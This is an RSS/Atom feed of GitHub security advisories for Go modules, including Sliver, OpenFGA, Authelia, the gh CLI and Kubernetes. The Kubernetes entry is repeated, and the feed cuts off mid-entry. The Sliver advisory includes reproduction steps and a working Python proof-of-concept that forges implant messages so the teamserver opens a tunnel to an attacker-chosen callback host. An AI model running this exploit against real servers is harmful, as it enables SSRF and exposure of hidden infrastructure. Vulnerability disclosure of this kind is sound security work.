<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-02-20T11:01:15.815Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/mayswind/ezbookkeeping] MaysWind ezBookkeeping has Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</id>
        <link href="https://github.com/advisories/GHSA-mpg8-8x9c-p9gv"/>
        <updated>2025-02-20T00:12:38.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the token component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57604">https://nvd.nist.gov/vuln/detail/CVE-2024-57604</a></li>
<li><a href="https://github.com/mayswind/ezbookkeeping/issues/33">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>
<li><a href="https://hkohi.ca/vulnerability/2">https://hkohi.ca/vulnerability/2</a></li>
<li><a href="https://github.com/advisories/GHSA-mpg8-8x9c-p9gv">https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-13T00:33:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/bishopfox/sliver] SSRF in sliver teamserver]]></title>
        <id>https://github.com/advisories/GHSA-fh4v-v779-4g2w</id>
        <link href="https://github.com/advisories/GHSA-fh4v-v779-4g2w"/>
        <updated>2025-02-19T21:11:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so</p>
<h3 id="reproduction-steps">Reproduction steps</h3>
<p>Run server</p>
<pre><code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x sliver-server_linux
./sliver-server_linux
</code></pre>
<p>Generate binary</p>
<pre><code>generate --mtls 127.0.0.1:8443
</code></pre>
<p>Run it on windows, then <code>Task manager -&gt; find process -&gt; Create memory dump file</code></p>
<p>Install RogueSliver and get the certs</p>
<pre><code>git clone https://github.com/ACE-Responder/RogueSliver.git
pip3 install -r requirements.txt --break-system-packages
python3 ExtractCerts.py implant.dmp
</code></pre>
<p>Start callback listener. Teamserver will connect when POC is run and send "ssrf poc" to nc</p>
<pre><code>nc -nvlp 1111
</code></pre>
<p>Run the poc (pasted at bottom of this file)</p>
<pre><code>python3 poc.py &lt;SLIVER IP&gt; &lt;MTLS PORT&gt; &lt;CALLBACK IP&gt; &lt;CALLBACK PORT&gt;
python3 poc.py 192.168.1.33 8443 44.221.186.72 1111
</code></pre>
<h3 id="details">Details</h3>
<p>We see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed</p>
<pre><code class="language-go">func handleSliverConnection(conn net.Conn) {
    mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
    implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())

    defer func() {
        mtlsLog.Debugf("mtls connection closing")
        conn.Close()
        implantConn.Cleanup()
    }()

    done := make(chan bool)
    go func() {
        defer func() {
            done &lt;- true
        }()
        handlers := serverHandlers.GetHandlers()
        for {
            envelope, err := socketReadEnvelope(conn)
            if err != nil {
                mtlsLog.Errorf("Socket read error %v", err)
                return
            }
            implantConn.UpdateLastMessage()
            if envelope.ID != 0 {
                implantConn.RespMutex.RLock()
                if resp, ok := implantConn.Resp[envelope.ID]; ok {
                    resp &lt;- envelope // Could deadlock, maybe want to investigate better solutions
                }
                implantConn.RespMutex.RUnlock()
            } else if handler, ok := handlers[envelope.Type]; ok {
                mtlsLog.Debugf("Received new mtls message type %d, data: %s", envelope.Type, envelope.Data)
                go func() {
                    respEnvelope := handler(implantConn, envelope.Data)
                    if respEnvelope != nil {
                        implantConn.Send &lt;- respEnvelope
                    }
                }()
            }
        }
    }()

Loop:
    for {
        select {
        case envelope := &lt;-implantConn.Send:
            err := socketWriteEnvelope(conn, envelope)
            if err != nil {
                mtlsLog.Errorf("Socket write failed %v", err)
                break Loop
            }
        case &lt;-done:
            break Loop
        }
    }
    mtlsLog.Debugf("Closing implant connection %s", implantConn.ID)
}
</code></pre>
<p>The available handlers:</p>
<pre><code class="language-go">func GetHandlers() map[uint32]ServerHandler {
    return map[uint32]ServerHandler{
        // Sessions
        sliverpb.MsgRegister:    registerSessionHandler,
        sliverpb.MsgTunnelData:  tunnelDataHandler,
        sliverpb.MsgTunnelClose: tunnelCloseHandler,
        sliverpb.MsgPing:        pingHandler,
        sliverpb.MsgSocksData:   socksDataHandler,

        // Beacons
        sliverpb.MsgBeaconRegister: beaconRegisterHandler,
        sliverpb.MsgBeaconTasks:    beaconTasksHandler,

        // Pivots
        sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,
        sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,
    }
}
</code></pre>
<p>If we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the <code>tunnelDataHandler</code> function</p>
<pre><code class="language-go">// The handler mutex prevents a send on a closed channel, without it
// two handlers calls may race when a tunnel is quickly created and closed.
func tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
    session := core.Sessions.FromImplantConnection(implantConn)
    if session == nil {
        sessionHandlerLog.Warnf("Received tunnel data from unknown session: %v", implantConn)
        return nil
    }
    tunnelHandlerMutex.Lock()
    defer tunnelHandlerMutex.Unlock()
    tunnelData := &amp;sliverpb.TunnelData{}
    proto.Unmarshal(data, tunnelData)

    sessionHandlerLog.Debugf("[DATA] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)

    rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)
    if rtunnel != nil &amp;&amp; session.ID == rtunnel.SessionID {
        RTunnelDataHandler(tunnelData, rtunnel, implantConn)
    } else if rtunnel != nil &amp;&amp; session.ID != rtunnel.SessionID {
        sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)
    } else if rtunnel == nil &amp;&amp; tunnelData.CreateReverse == true {
        createReverseTunnelHandler(implantConn, data)
        //RTunnelDataHandler(tunnelData, rtunnel, implantConn)
    } else {
        tunnel := core.Tunnels.Get(tunnelData.TunnelID)
        if tunnel != nil {
            if session.ID == tunnel.SessionID {
                tunnel.SendDataFromImplant(tunnelData)
            } else {
                sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
            }
        } else {
            sessionHandlerLog.Warnf("Data sent on nil tunnel %d", tunnelData.TunnelID)
        }
    }

    return nil
}
</code></pre>
<p>The <code>createReverseTunnelHandler</code> reads the envelope, creating a socket for <code>req.Rportfwd.Host</code> and <code>req.Rportfwd.Port</code>.  It will write <code>recv.Data</code> to it</p>
<pre><code class="language-go">func createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
    session := core.Sessions.FromImplantConnection(implantConn)

    req := &amp;sliverpb.TunnelData{}
    proto.Unmarshal(data, req)

    var defaultDialer = new(net.Dialer)

    remoteAddress := fmt.Sprintf("%s:%d", req.Rportfwd.Host, req.Rportfwd.Port)

    ctx, cancelContext := context.WithCancel(context.Background())

    dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
    //dst, err := net.Dial("tcp", remoteAddress)
    if err != nil {
        tunnelClose, _ := proto.Marshal(&amp;sliverpb.TunnelData{
            Closed:   true,
            TunnelID: req.TunnelID,
        })
        implantConn.Send &lt;- &amp;sliverpb.Envelope{
            Type: sliverpb.MsgTunnelClose,
            Data: tunnelClose,
        }
        cancelContext()
        return nil
    }

    if conn, ok := dst.(*net.TCPConn); ok {
        // {{if .Config.Debug}}
        //log.Printf("[portfwd] Configuring keep alive")
        // {{end}}
        conn.SetKeepAlive(true)
        // TODO: Make KeepAlive configurable
        conn.SetKeepAlivePeriod(1000 * time.Second)
    }

    tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)
    rtunnels.AddRTunnel(tunnel)
    cleanup := func(reason error) {
        // {{if .Config.Debug}}
        sessionHandlerLog.Infof("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
        // {{end}}
        tunnel := rtunnels.GetRTunnel(tunnel.ID)
        rtunnels.RemoveRTunnel(tunnel.ID)
        dst.Close()
        cancelContext()
    }

    go func() {
        tWriter := tunnelWriter{
            tun:  tunnel,
            conn: implantConn,
        }
        // portfwd only uses one reader, hence the tunnel.Readers[0]
        n, err := io.Copy(tWriter, tunnel.Readers[0])
        _ = n // avoid not used compiler error if debug mode is disabled
        // {{if .Config.Debug}}
        sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)
        // {{end}}

        cleanup(err)
    }()

    tunnelDataCache.Add(tunnel.ID, req.Sequence, req)

    // NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
    // from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
    // is used here whereas WriteSequence is used for data written back to the server

    // Go through cache and write all sequential data to the reader
    for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
        // {{if .Config.Debug}}
        //sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
        // {{end}}
        tunnel.Writer.Write(recv.Data)

        // Delete the entry we just wrote from the cache
        tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
        tunnel.IncReadSequence() // Increment sequence counter

        // {{if .Config.Debug}}
        //sessionHandlerLog.Infof("[message just received] %v", tunnelData)
        // {{end}}
    }

    //If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
    //Send a Resend packet to have the msg resent from the cache
    if tunnelDataCache.Len(tunnel.ID) &gt; 3 {
        data, err := proto.Marshal(&amp;sliverpb.TunnelData{
            Sequence: tunnel.WriteSequence(), // The tunnel write sequence
            Ack:      tunnel.ReadSequence(),
            Resend:   true,
            TunnelID: tunnel.ID,
            Data:     []byte{},
        })
        if err != nil {
            // {{if .Config.Debug}}
            //sessionHandlerLog.Infof("[shell] Failed to marshal protobuf %s", err)
            // {{end}}
        } else {
            // {{if .Config.Debug}}
            //sessionHandlerLog.Infof("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
            // {{end}}
            implantConn.RequestResend(data)
        }
    }
    return nil
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>For current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now</p>
<p>To exploit this for MTLS listeners, you will need MTLS keys
For HTTP listeners, you will need to generate valid nonce
Not sure about other transport types</p>
<h3 id="poc">POC</h3>
<p>POC code, it is not cleaned up at all, please forgive me</p>
<pre><code class="language-python">#!/usr/bin/python
import sys
import time
import base64
import socket, ssl
from RogueSliver.consts import msgs
import random
import struct
import RogueSliver.sliver_pb2 as sliver
import json
import argparse
import uuid
from google.protobuf import json_format
from rich import print
import random
import string

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE



def generate_random_string(length=8):
    # Combine letters and digits
    characters = string.ascii_letters + string.digits
    # Generate random string
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def rand_unicode(junk_sz):
  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()
  return(junk)

def junk_register(junk_sz):
  n = generate_random_string()
  register = {
        "Name": "chebuya"+n,
        "Hostname": "chebuya.local"+n,
        "Uuid": "uuid"+n,
        "Username": "username"+n,
        "Uid": "uid"+n,
        "Gid": "gid"+n,
        "Os": "os"+n,
        "Arch": "arch"+n,
        "Pid": 10,
        "Filename": "filename"+n,
        "ActiveC2": "activec2"+n,
        "Version": "version"+n,
        "ReconnectInterval": 60,
        "ConfigID": "config_id"+n,
        "PeerID": -1,
        "Locale": "locale" + n
  }

  return register



def make_ping_env():
  reg = sliver.Ping()
  json_format.Parse(json.dumps({}),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Ping')
  envelope.Data = reg.SerializeToString()

  return envelope



def make_rt_env():
    
    jdata = {
            "Data": "c3NyZiBwb2M=",
            "Closed": False,
            "Sequence": 0,
            "Ack": 0,
            "Resend": False,
            "CreateReverse": True,
            "rportfwd": {
                "Port": int(sys.argv[4]),
                "Host": sys.argv[3],
                "TunnelID": 0,
            },
            "TunnelID": 0,
    }



    reg = sliver.TunnelData()
    json_format.Parse(json.dumps(jdata),reg)
    envelope = sliver.Envelope()
    envelope.Type = msgs.index('TunnelData')
    envelope.Data = reg.SerializeToString()

    return envelope




def send_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s,) as ssock:
      ssock.connect((ip,port))

      print(len(envelope.SerializeToString()))
      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )
      data_len = struct.pack('I', len(envelope.SerializeToString()) )




      envelope3 = make_rt_env()
      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )

      print(data_len)

      ssock.write(data_len + envelope.SerializeToString()) 
      ssock.write(data_len3 + envelope3.SerializeToString())



    
      # No idea why this is reqauired
      while True:
          time.sleep(2)
          ssock.write(data_len3 + envelope3.SerializeToString())



def register_session(ip,port):
  print('[yellow]\[i][/yellow] Sending session registration.')
  reg = sliver.Register()
  json_format.Parse(json.dumps(junk_register(50)),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Register')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

def register_beacon(ip,port):
  print('[yellow]\[i][/yellow] Sending beacon registration.')
  reg = sliver.BeaconRegister()
  reg.ID = str(uuid.uuid4())
  junk_sz = 50
  reg.Interval = random.randint(0,10*junk_sz)
  reg.Jitter = random.randint(0,10*junk_sz)
  reg.NextCheckin = random.randint(0,10*junk_sz)
  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconRegister')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

description = '''
Flood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.
'''

if __name__ == '__main__':
  register_session(sys.argv[1], int(sys.argv[2]))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w">https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w</a></li>
<li><a href="https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f">https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f</a></li>
<li><a href="https://github.com/advisories/GHSA-fh4v-v779-4g2w">https://github.com/advisories/GHSA-fh4v-v779-4g2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh4v-v779-4g2w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-19T21:11:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-g4v5-6f5p-m38j</id>
        <link href="https://github.com/advisories/GHSA-g4v5-6f5p-m38j"/>
        <updated>2025-02-19T22:39:16.000Z</updated>
        <content type="html"><![CDATA[<p>Overview
OpenFGA v1.8.4 or previous (Helm chart &lt; openfga-0.2.22, docker &lt; v.1.8.5) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.</p>
<p>Am I Affected?
If you are using OpenFGA v1.8.4 or previous, specifically under the following conditions, you are affected by this authorization bypass vulnerability:</p>
<ul>
<li>Calling Check API or ListObjects with a model that has a relation <a href="https://openfga.dev/docs/concepts#what-is-a-directly-related-user-type">directly assignable</a> to both <a href="https://openfga.dev/docs/concepts#what-is-type-bound-public-access">public access</a> AND <a href="https://openfga.dev/docs/concepts#what-is-a-user">userset</a> with the <a href="https://openfga.dev/docs/concepts#what-is-a-type">same type</a>, and</li>
<li>A type bound public access tuple is assigned to an object, and</li>
<li>userset tuple is not assigned to the same object, and</li>
<li>Check request's user field is a userset that has the same type as the type bound public access tuple's user type</li>
</ul>
<p>Fix
Upgrade to v1.8.5. This upgrade is backwards compatible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j">https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j</a></li>
<li><a href="https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588">https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25196">https://nvd.nist.gov/vuln/detail/CVE-2025-25196</a></li>
<li><a href="https://github.com/advisories/GHSA-g4v5-6f5p-m38j">https://github.com/advisories/GHSA-g4v5-6f5p-m38j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4v5-6f5p-m38j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-19T20:25:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authelia/authelia/v4] Authelia applies regulation separately to Username-based logins to Email-based logins]]></title>
        <id>https://github.com/advisories/GHSA-m5mf-3963-4x26</id>
        <link href="https://github.com/advisories/GHSA-m5mf-3963-4x26"/>
        <updated>2025-02-19T20:00:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If users are allowed to sign in via both username and email the regulation system treats these as separate login events. This leads to the regulation limitations being effectively doubled assuming an attacker using brute-force to find a user password. It's important to note that due to the effective operation of regulation where no user-facing sign of their regulation ban being visible either via timing or via API responses, it's effectively impossible to determine if a failure occurs due to a bad username password combination, or a effective ban blocking the attempt which heavily mitigates any form of brute-force.</p>
<h3 id="details">Details</h3>
<p>This occurs because the records and counting process for this system uses the method utilized for sign in rather than the effective username attribute.</p>
<h3 id="impact">Impact</h3>
<p>This has a minimal impact on account security, this impact is increased naturally in scenarios when there is no two-factor authentication required and weak passwords are used. This makes it a bit easier to brute-force a password.</p>
<h3 id="workarounds">Workarounds</h3>
<ol>
<li>Do not heavily modify the default settings in a way that ends up with shorter or less frequent regulation bans. The default settings effectively mitigate any potential for this issue to be exploited.</li>
<li>Disable the ability for users to login via an email address.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26">https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26</a></li>
<li><a href="https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c">https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24806">https://nvd.nist.gov/vuln/detail/CVE-2025-24806</a></li>
<li><a href="https://github.com/advisories/GHSA-m5mf-3963-4x26">https://github.com/advisories/GHSA-m5mf-3963-4x26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5mf-3963-4x26</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-19T17:47:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cli/cli/v2] `gh attestation verify` returns incorrect exit code during verification if no attestations are present]]></title>
        <id>https://github.com/advisories/GHSA-fgw4-v983-mgp8</id>
        <link href="https://github.com/advisories/GHSA-fgw4-v983-mgp8"/>
        <updated>2025-02-17T07:28:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in GitHub's Artifact Attestation CLI tool, <code>gh attestation verify</code>, may return an incorrect zero exit status when no matching attestations are found for the specified <code>--predicate-type &lt;value&gt;</code> or the default <code>https://slsa.dev/provenance/v1</code> if not specified. This issue only arises if an artifact has an attestation with a predicate type different from the one provided in the command. As a result, users relying solely on these exit codes may mistakenly believe the attestation has been verified, despite the absence of an attestation with the specified predicate type and the tool printing a verification failure.</p>
<p>Users are advised to update <code>gh</code> to version <code>v2.67.0</code> as soon as possible.</p>
<p>Initial report: <a href="https://github.com/cli/cli/issues/10418">https://github.com/cli/cli/issues/10418</a>
Fix: <a href="https://github.com/cli/cli/pull/10421">https://github.com/cli/cli/pull/10421</a></p>
<h3 id="details">Details</h3>
<p>The gh attestation verify command fetches, loads, and attempts to verify attestations associated with a given artifact for a specified predicate type. If an attestation is found, but the predicate type does not match the one specified in the <code>gh attestation verify</code> command, the verification fails, but the program exits early.</p>
<p>Due to a re-used uninitialized error variable, when no matching attestations are found, the relevant function returns <code>nil</code> instead of an error, causing the program to exit with a status code of <code>0</code>, which incorrectly suggests successful verification.</p>
<h3 id="poc">PoC</h3>
<p>Run <code>gh attestation verify</code> with local attestations using the <code>--bundle</code> flag and specify a predicate type with <code>--predicate-type</code> that you know will not match any of the attestations the command will attempt to verify. Confirm that the command exits with a zero status code.</p>
<h3 id="impact">Impact</h3>
<p>Users who rely exclusively on the exit status code of <code>gh attestation verify</code> may incorrectly verify an attestation when the attestation's predicate type does not match the specified predicate type in the command.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8">https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8</a></li>
<li><a href="https://github.com/cli/cli/issues/10418">https://github.com/cli/cli/issues/10418</a></li>
<li><a href="https://github.com/cli/cli/pull/10421">https://github.com/cli/cli/pull/10421</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25204">https://nvd.nist.gov/vuln/detail/CVE-2025-25204</a></li>
<li><a href="https://github.com/advisories/GHSA-fgw4-v983-mgp8">https://github.com/advisories/GHSA-fgw4-v983-mgp8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fgw4-v983-mgp8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T17:19:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mayswind/ezbookkeeping] Missing rate limit in MaysWind ezBookkeeping]]></title>
        <id>https://github.com/advisories/GHSA-772m-773g-qmhc</id>
        <link href="https://github.com/advisories/GHSA-772m-773g-qmhc"/>
        <updated>2025-02-13T22:43:45.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the lack of rate limiting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57603">https://nvd.nist.gov/vuln/detail/CVE-2024-57603</a></li>
<li><a href="https://github.com/mayswind/ezbookkeeping/issues/33">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>
<li><a href="https://hkohi.ca/vulnerability/1">https://hkohi.ca/vulnerability/1</a></li>
<li><a href="https://github.com/advisories/GHSA-772m-773g-qmhc">https://github.com/advisories/GHSA-772m-773g-qmhc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-772m-773g-qmhc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T00:33:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
